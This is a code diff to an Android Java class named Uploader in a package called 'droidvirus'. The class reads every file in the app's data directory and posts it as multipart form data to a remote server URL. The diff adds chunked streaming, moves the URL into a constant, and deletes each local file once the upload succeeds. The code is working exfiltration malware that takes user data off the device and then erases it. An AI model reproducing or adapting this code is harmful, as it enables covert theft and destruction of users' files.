@@ -2,27 +2,30 @@ package com.artisanter.droidvirus;
 
 import android.content.Context;
 
-import java.io.DataOutputStream;
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
 class Uploader {
-    static void uploadAll(Context context){
+    static void uploadAll(Context context) {
         String dir = context.getApplicationInfo().dataDir;
-        for(File file: new File(dir).listFiles()) {
-            postFile(file.getName(), file);
+        for (File file : new File(dir).listFiles()) {
+            if (file.isFile())
+                postFile(file.getName(), file);
         }
     }
+
     private static void postFile(final String fileName, final File file) {
         String crlf = "\r\n";
         String twoHyphens = "--";
         String boundary = "*****";
         try {
             HttpURLConnection httpUrlConnection;
-            URL url = new URL("http://example.com/server.cgi");
+            URL url = new URL(Constants.URL);
             httpUrlConnection = (HttpURLConnection) url.openConnection();
             httpUrlConnection.setUseCaches(false);
             httpUrlConnection.setDoOutput(true);
@@ -32,38 +35,46 @@ class Uploader {
             httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
             httpUrlConnection.setRequestProperty(
                     "Content-Type", "multipart/form-data;boundary=" + boundary);
-            DataOutputStream request = new DataOutputStream(
-                    httpUrlConnection.getOutputStream());
 
-            request.writeBytes(twoHyphens + boundary + crlf);
-            request.writeBytes("Content-Disposition: form-data; name=\"" +
-                    fileName + "\";filename=\"" +
-                    fileName + "\"" + crlf);
-            request.writeBytes(crlf);
+            OutputStream outputStreamToRequestBody = httpUrlConnection.getOutputStream();
+            BufferedWriter writer =
+                    new BufferedWriter(new OutputStreamWriter(outputStreamToRequestBody));
 
-            byte[] bytes = toByteArray(file);
-            request.write(bytes);
-            request.writeBytes(crlf);
-            request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
-            request.flush();
-            request.close();
-        } catch (Exception ignored) {
+
+            writer.write(twoHyphens + boundary + crlf);
+            writer.write("Content-Disposition: form-data; " +
+                    "name=\"" + fileName + "\";" +
+                    "filename=\"" + fileName + "\"" + crlf);
+            writer.write(crlf);
+            writer.flush();
+
+
+            FileInputStream inputStreamToLogFile = new FileInputStream(file);
+
+            int bytesRead;
+            byte[] dataBuffer = new byte[4096];
+            while ((bytesRead = inputStreamToLogFile.read(dataBuffer)) != -1) {
+                outputStreamToRequestBody.write(dataBuffer, 0, bytesRead);
+            }
+            outputStreamToRequestBody.flush();
+
+            writer.write(crlf);
+            writer.write(twoHyphens + boundary + twoHyphens + crlf);
+            writer.flush();
+
+            writer.close();
+            outputStreamToRequestBody.close();
+
+
+            int code = httpUrlConnection.getResponseCode();
+            System.out.println(code);
+            if(code == HttpURLConnection.HTTP_OK) {
+                file.delete();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
 
-    }
-
-    private static byte[] toByteArray(File file){
-        FileInputStream fis;
-        byte[] bArray = new byte[(int) file.length()];
-        try{
-            fis = new FileInputStream(file);
-            fis.read(bArray);
-            fis.close();
-
-        }catch(IOException ioExp){
-            ioExp.printStackTrace();
-        }
-        return bArray;
     }
 }
 
